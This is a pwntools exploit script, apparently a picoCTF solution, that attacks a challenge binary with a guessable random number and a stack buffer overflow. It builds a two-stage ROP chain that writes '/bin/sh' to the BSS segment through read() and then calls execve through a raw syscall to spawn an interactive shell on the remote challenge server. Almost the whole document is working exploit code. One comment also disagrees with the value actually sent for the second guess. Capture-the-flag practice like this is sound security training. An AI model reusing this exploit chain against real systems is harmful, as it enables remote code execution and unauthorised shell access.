#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe

PADDING = b'A' * 120		# cyclic -n 8 0x6161616161616170 (after correct answer)


def conn():
	if args.LOCAL:
		r = process([exe.path])

		if args.PLT_DEBUG:
			gdb.attach(r)
	else:
		r = remote("jupiter.challenges.picoctf.org", 42953)

	return r


def main():
	r = conn()
	rop = ROP(exe)

	# Functions
	read = exe.symbols['read']
	main = exe.symbols['main']
	bss  = 0x6b7000		# BSS segment address which is writable (good to store the string!; found with GDB)

	# Gadgets
	pop_rdi  = rop.find_gadget(['pop rdi', 'ret'])[0]
	pop_rsi  = rop.find_gadget(['pop rsi', 'ret'])[0]
	pop_rdx  = rop.find_gadget(['pop rdx', 'ret'])[0]
	pop_rax  = rop.find_gadget(['pop rax', 'ret'])[0]
	syscall  = rop.find_gadget(['syscall'])[0]

	# If srand is not called, rand acts as if srand(1) has been called.
	# First number generated is 84, but it depends on the architecture, compiler and many other things
	r.sendlineafter(b'What number would you like to guess?\n', '84')

	payload =  PADDING
	payload += p64(pop_rdi) + p64(0)			# 1st argument is the file descriptor (0 --> input)
	payload += p64(pop_rsi) + p64(bss)			# 2nd argument is the buffer address where we will store the string read
	payload += p64(pop_rdx) + p64(8)			# Set 3rd argument to 8 (count)
	payload += p64(read)
	payload += p64(main)						# Re-exploit the buffer overflow

	r.sendlineafter(b'Name? ', payload)
	input('Press ENTER to send the string...')
	r.sendline(b'/bin/sh\x00')

	# Second number generated is 87
	r.sendlineafter(b'What number would you like to guess?\n', '78')

	payload =  PADDING
	payload += p64(pop_rdi) + p64(bss)			# Set 1st argument to the address of '/bin/sh' stored in the BSS segment
	payload += p64(pop_rsi) + p64(0)			# Set 2nd argument to 0 (nullptr)
	payload += p64(pop_rdx) + p64(0)			# Set 3rd argument to 0 (nullptr)
	payload += p64(pop_rax) + p64(59)
	payload += p64(syscall)

	r.sendlineafter(b'Name? ', payload)
	r.interactive()


if __name__ == "__main__":
	main()